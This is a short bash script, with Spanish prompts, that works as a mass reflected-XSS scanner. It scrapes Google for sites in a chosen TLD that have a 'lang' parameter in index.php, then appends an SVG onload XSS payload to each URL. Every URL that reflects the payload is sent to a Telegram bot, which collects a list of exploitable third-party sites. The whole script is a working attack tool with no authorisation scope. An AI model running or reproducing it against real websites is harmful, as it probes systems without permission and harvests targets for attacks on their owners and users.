#!/bin/bash

payload1=$(echo '"><svg+onload=alert(556611)>');
payload2=$(echo '"><svg+onload=alert(document.domain)>');


echo " __   __ _____ _____   __ _           _           "
echo " \ \ / // ____/ ____| / _(_)         | |          "
echo "  \ V /| (___| (___  | |_ _ _ __   __| | ___ _ __ "
echo "   > <  \___ \\\___ \ |  _| | '_ \ /  \` |/ _ \ '__|"
echo "  / . \ ____) |___) || | | | | | | (_| |  __/ |   "
echo -e " /_/ \_\_____/_____/ |_| |_|_| |_|\__,_|\___|_|   \n"

read -p "[?] Escriba el TLD deseado: " tld

curl -s "https://www.google.com/search?q=inurl:/index.php?lang=%20site:$tld&num=10000" -A "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" > tmp.raw

cat tmp.raw | grep "?lang=" | sed 's/?lang=/?lang=\n\n\n/g' | sed 's/<a href="http/\n\n\n<a href="http/g' | grep '<a href="http' | grep "?lang=" | grep -v google.com | grep -v "inurl" | sed 's/<a href="h/h/g' | sort | uniq > Google.tmp
echo -e "\n[+] Se identificaron un total de $(wc -l Google.tmp | cut -d " " -f1) URL(s)"
sleep 3

echo -e "\n[!] Iniciando la validación\n"
for url in $(cat Google.tmp);
do echo -e "\t Comprobando $(cat Google.tmp | grep -n $url | cut -d ":" -f1) de $(cat Google.tmp | wc -l)"; curl -sk $url$payload1 -m 25 | grep 556611 >/dev/null;
if [ $? -eq 0 ]; then
curl -s -d 'chat_id=[ID]&disable_web_page_preview=1&text='$url$payload2 https://api.telegram.org/bot[Token_API]/sendMessage >/dev/null;
fi;
done;
echo -e "\n[!] Fin de la validación\n"
rm tmp.raw
rm Google.tmp
